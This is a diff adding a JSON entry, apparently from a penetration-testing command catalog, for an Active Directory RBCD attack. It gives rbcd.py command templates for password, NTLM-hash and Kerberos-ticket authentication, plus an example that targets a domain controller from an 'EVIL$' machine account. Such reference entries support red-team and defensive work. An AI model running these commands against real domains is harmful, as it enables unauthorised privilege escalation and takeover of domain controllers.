@@ -1,0 +1,35 @@
+{
+  "id": "rbcd-attack",
+  "name": "RBCD Attack",
+  "command": "python3 rbcd.py -delegate-from '<computer>' -delegate-to '<target>' -dc-ip <ip> '<domain>/<user>:<password>'",
+  "description": "Configure Resource-Based Constrained Delegation (RBCD) on a target computer",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "ldap"
+  ],
+  "tags": [
+    "rbcd",
+    "delegation",
+    "resource-based",
+    "constrained-delegation",
+    "msds-allowedtoactonbehalfofotheridentity"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "python3 rbcd.py -delegate-from '<computer>' -delegate-to '<target>' -dc-ip <ip> -hashes ':<hash>' '<domain>/<user>'"
+    },
+    {
+      "label": "Kerberos Ticket",
+      "requires": "ticket",
+      "command": "python3 rbcd.py -delegate-from '<computer>' -delegate-to '<target>' -dc-ip <ip> -k -no-pass '<domain>/<user>'"
+    }
+  ],
+  "examples": [
+    "python3 rbcd.py -delegate-from 'EVIL$' -delegate-to 'DC01$' -dc-ip 192.168.1.100 'corp.local/user:password'"
+  ]
+}
